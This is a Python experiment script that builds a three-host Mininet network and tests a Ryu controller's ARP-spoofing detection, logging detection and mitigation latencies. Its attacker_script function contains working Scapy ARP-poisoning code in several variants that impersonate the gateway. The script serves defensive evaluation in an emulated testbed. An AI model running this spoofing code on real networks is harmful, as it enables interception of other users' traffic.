#!/usr/bin/env python3
"""Run a real Mininet/Ryu ARP spoofing runtime experiment.

Topology: h1 victim, h2 gateway/target, h3 attacker on one OpenFlow switch.
The Ryu ARP guard detects IP->MAC conflicts and installs a drop rule.
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import socket
import subprocess
import sys
import time
from pathlib import Path

from mininet.cli import CLI
from mininet.link import TCLink
from mininet.log import setLogLevel
from mininet.net import Mininet
from mininet.node import OVSSwitch, RemoteController


def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--duration", type=float, default=18.0)
    p.add_argument("--attack-start", type=float, default=6.0)
    p.add_argument("--attack-rate", type=float, default=0.05)
    p.add_argument(
        "--attack-variant",
        choices=["standard", "slow", "intermittent", "random_mac", "request_poison", "unicast_reply", "burst_then_sleep"],
        default="standard",
        help="ARP poisoning variant for stress testing.",
    )
    p.add_argument("--no-attack", action="store_true", help="Run a benign-only episode without launching the spoofing process.")
    p.add_argument(
        "--benign-variant",
        choices=[
            "standard",
            "gratuitous",
            "dhcp_like",
            "arp_scan",
            "noisy_gratuitous",
            "gateway_failover",
            "ip_reassignment",
            "arp_storm",
        ],
        default="standard",
        help="Benign ARP behavior to inject during normal-only stress episodes.",
    )
    p.add_argument(
        "--background-mode",
        choices=["quiet", "light", "mixed", "burst"],
        default="light",
        help="Benign background traffic during the episode.",
    )
    p.add_argument("--controller-cmd", default=".venv/bin/ryu-manager sdn_runtime/arp_guard_controller.py")
    p.add_argument("--event-log", type=Path, default=Path("/tmp/arp_guard_events.jsonl"))
    p.add_argument("--out-dir", type=Path, default=Path("results/sdn_runtime_arp"))
    p.add_argument("--cli", action="store_true")
    return p.parse_args()


def wait_for_port(host: str, port: int, timeout: float = 8.0) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=0.5):
                return True
        except OSError:
            time.sleep(0.25)
    return False


def start_controller(args):
    env = os.environ.copy()
    env["PYTHONPATH"] = "."
    env["ARP_GUARD_EVENT_LOG"] = str(args.event_log)
    cmd = args.controller_cmd.split()
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env)
    if not wait_for_port("127.0.0.1", 6653, timeout=10.0):
        print("warning: controller port 6653 was not reachable before Mininet start", file=sys.stderr)
    return proc


def build_net():
    net = Mininet(controller=RemoteController, switch=OVSSwitch, link=TCLink, autoSetMacs=True, build=False)
    net.addController("c0", controller=RemoteController, ip="127.0.0.1", port=6653)
    s1 = net.addSwitch("s1", protocols="OpenFlow13")
    h1 = net.addHost("h1", ip="10.0.0.1/24", mac="00:00:00:00:00:01")
    h2 = net.addHost("h2", ip="10.0.0.2/24", mac="00:00:00:00:00:02")
    h3 = net.addHost("h3", ip="10.0.0.3/24", mac="00:00:00:00:00:03")
    for h in [h1, h2, h3]:
        net.addLink(h, s1, bw=100, delay="1ms")
    net.build()
    net.start()
    return net, h1, h2, h3


def attacker_script(target_ip, victim_ip, interval, variant):
    if variant == "slow":
        interval = max(float(interval), 1.0)
    return f"""
import random
import time
from scapy.all import ARP, Ether, sendp
iface='h3-eth0'
variant={variant!r}
def spoof_mac():
    if variant == 'random_mac':
        return '02:aa:%02x:%02x:%02x:%02x' % tuple(random.randrange(256) for _ in range(4))
    return '00:00:00:00:00:03'
while True:
    mac=spoof_mac()
    if variant == 'request_poison':
        pkt=Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ARP(
            op=1,
            hwsrc=mac,
            psrc={target_ip!r},
            hwdst='00:00:00:00:00:00',
            pdst={victim_ip!r},
        )
        sendp(pkt, iface=iface, verbose=False)
    elif variant == 'unicast_reply':
        pkt=Ether(src=mac, dst='00:00:00:00:00:01')/ARP(
            op=2,
            hwsrc=mac,
            psrc={target_ip!r},
            hwdst='00:00:00:00:00:01',
            pdst={victim_ip!r},
        )
        sendp(pkt, iface=iface, verbose=False)
    elif variant == 'burst_then_sleep':
        for _ in range(4):
            pkt=Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ARP(
                op=2,
                hwsrc=mac,
                psrc={target_ip!r},
                hwdst='ff:ff:ff:ff:ff:ff',
                pdst={victim_ip!r},
            )
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(0.05)
    else:
        pkt=Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ARP(
            op=2,
            hwsrc=mac,
            psrc={target_ip!r},
            hwdst='ff:ff:ff:ff:ff:ff',
            pdst={victim_ip!r},
        )
        sendp(pkt, iface=iface, verbose=False)
    if variant == 'intermittent':
        time.sleep({float(interval)!r})
        time.sleep(1.25)
        continue
    if variant == 'burst_then_sleep':
        time.sleep(max({float(interval)!r}, 2.0))
        continue
    time.sleep({float(interval)!r})
"""


def benign_arp_script(variant):
    return f"""
import time
from scapy.all import ARP, Ether, sendp
iface='h2-eth0'
variant={variant!r}
def send_gratuitous(ip='10.0.0.2', mac='00:00:00:00:00:02'):
    pkt=Ether(src=mac, dst='ff:ff:ff:ff:ff:ff')/ARP(op=2, hwsrc=mac, psrc=ip, hwdst='ff:ff:ff:ff:ff:ff', pdst=ip)
    sendp(pkt, iface=iface, verbose=False)
def send_probe(ip):
    pkt=Ether(src='00:00:00:00:00:02', dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, hwsrc='00:00:00:00:00:02', psrc='10.0.0.2', hwdst='00:00:00:00:00:00', pdst=ip)
    sendp(pkt, iface=iface, verbose=False)
while True:
    if variant == 'gratuitous':
        send_gratuitous()
    elif variant == 'dhcp_like':
        send_gratuitous('10.0.0.20')
        time.sleep(0.2)
        send_gratuitous('10.0.0.2')
    elif variant == 'arp_scan':
        for i in range(1, 8):
            send_probe('10.0.0.%d' % i)
            time.sleep(0.08)
    elif variant == 'noisy_gratuitous':
        send_gratuitous()
        time.sleep(0.1)
        send_probe('10.0.0.254')
    elif variant == 'gateway_failover':
        # Legitimate failover-like pattern: the same service IP is announced by
        # a backup MAC. This intentionally stresses MAC-conflict policies.
        send_gratuitous('10.0.0.2', '00:00:00:00:00:02')
        time.sleep(0.25)
        send_gratuitous('10.0.0.2', '00:00:00:00:00:22')
    elif variant == 'ip_reassignment':
        # DHCP/reassignment-like churn where an address moves between hosts.
        send_gratuitous('10.0.0.20', '00:00:00:00:00:02')
        time.sleep(0.25)
        send_gratuitous('10.0.0.20', '00:00:00:00:00:03')
    elif variant == 'arp_storm':
        for i in range(1, 16):
            send_probe('10.0.0.%d' % i)
            if i % 3 == 0:
                send_gratuitous('10.0.0.%d' % i, '00:00:00:00:00:02')
            time.sleep(0.03)
    time.sleep(1.0)
"""


def run_background_traffic(h1, h2, h3, mode: str, tick: int):
    h1.cmd("ping -c 1 -W 1 10.0.0.2 >/tmp/runtime_ping_h1_h2.log 2>&1 &")
    if mode in ("light", "mixed") and tick % 2 == 0:
        h2.cmd("ping -c 1 -W 1 10.0.0.1 >/tmp/runtime_ping_h2_h1.log 2>&1 &")
    if mode == "mixed":
        if tick % 3 == 0:
            h3.cmd("ping -c 1 -W 1 10.0.0.1 >/tmp/runtime_ping_h3_h1.log 2>&1 &")
        if tick % 4 == 0:
            h1.cmd("ping -c 1 -W 1 10.0.0.3 >/tmp/runtime_ping_h1_h3.log 2>&1 &")
    if mode == "burst":
        h1.cmd("ping -c 3 -i 0.2 -W 1 10.0.0.2 >/tmp/runtime_ping_burst_h1_h2.log 2>&1 &")
        h2.cmd("ping -c 3 -i 0.2 -W 1 10.0.0.1 >/tmp/runtime_ping_burst_h2_h1.log 2>&1 &")
        h3.cmd("ping -c 2 -i 0.2 -W 1 10.0.0.1 >/tmp/runtime_ping_burst_h3_h1.log 2>&1 &")


def read_events(path: Path):
    events = []
    if not path.exists():
        return events
    for line in path.read_text(encoding="utf-8").splitlines():
        try:
            events.append(json.loads(line))
        except json.JSONDecodeError:
            pass
    return events


def summarize(events, attack_start_ts, out_dir, attack_enabled):
    alerts = [e for e in events if e.get("event") == "arp_spoof_alert"]
    drops = [e for e in events if e.get("event") == "drop_rule_installed"]
    arp_obs = [e for e in events if e.get("event") == "arp_observed"]
    first_alert = alerts[0]["timestamp"] if alerts else None
    first_drop = drops[0]["timestamp"] if drops else None
    summary = {
        "attack_enabled": bool(attack_enabled),
        "attack_start_timestamp": attack_start_ts,
        "arp_observed_events": len(arp_obs),
        "alerts": len(alerts),
        "drop_rules": len(drops),
        "detected": bool(alerts),
        "mitigated": bool(drops),
        "detection_latency_sec": None if (first_alert is None or not attack_enabled) else max(0.0, first_alert - attack_start_ts),
        "mitigation_latency_sec": None if (first_drop is None or not attack_enabled) else max(0.0, first_drop - attack_start_ts),
        "false_alert_before_attack": 0 if not attack_enabled else sum(1 for e in alerts if e["timestamp"] < attack_start_ts),
        "false_alerts_in_benign_episode": len(alerts) if not attack_enabled else 0,
    }
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "runtime_summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    with (out_dir / "runtime_events.csv").open("w", newline="", encoding="utf-8") as f:
        keys = sorted({k for e in events for k in e.keys()})
        w = csv.DictWriter(f, fieldnames=keys)
        w.writeheader()
        w.writerows(events)
    return summary


def main():
    args = parse_args()
    args.out_dir.mkdir(parents=True, exist_ok=True)
    if args.event_log.exists():
        args.event_log.unlink()
    ctrl = start_controller(args)
    net = None
    attack_proc = None
    benign_proc = None
    attack_start_ts = None
    attack_enabled = not args.no_attack
    try:
        net, h1, h2, h3 = build_net()
        # Prime ARP table with legitimate traffic.
        h1.cmd("ping -c 2 10.0.0.2 >/tmp/h1_ping_h2.log 2>&1")
        h2.cmd("ping -c 2 10.0.0.1 >/tmp/h2_ping_h1.log 2>&1")
        t0 = time.time()
        tick = 0
        while time.time() - t0 < args.duration:
            elapsed = time.time() - t0
            if attack_enabled and attack_proc is None and elapsed >= args.attack_start:
                attack_start_ts = time.time()
                attack_proc = h3.popen([sys.executable, "-c", attacker_script("10.0.0.2", "10.0.0.1", args.attack_rate, args.attack_variant)])
            if not attack_enabled and args.benign_variant != "standard" and benign_proc is None and elapsed >= 2.0:
                benign_proc = h2.popen([sys.executable, "-c", benign_arp_script(args.benign_variant)])
            run_background_traffic(h1, h2, h3, args.background_mode, tick)
            tick += 1
            time.sleep(1.0)
        if args.cli:
            CLI(net)
    finally:
        if attack_proc is not None:
            attack_proc.terminate()
        if benign_proc is not None:
            benign_proc.terminate()
        if net is not None:
            net.stop()
        time.sleep(1.0)
        ctrl.terminate()
        try:
            ctrl.wait(timeout=3)
        except subprocess.TimeoutExpired:
            ctrl.kill()
    events = read_events(args.event_log)
    if attack_start_ts is None:
        attack_start_ts = time.time() if attack_enabled else None
    summary = summarize(events, attack_start_ts, args.out_dir, attack_enabled)
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    setLogLevel("info")
    main()
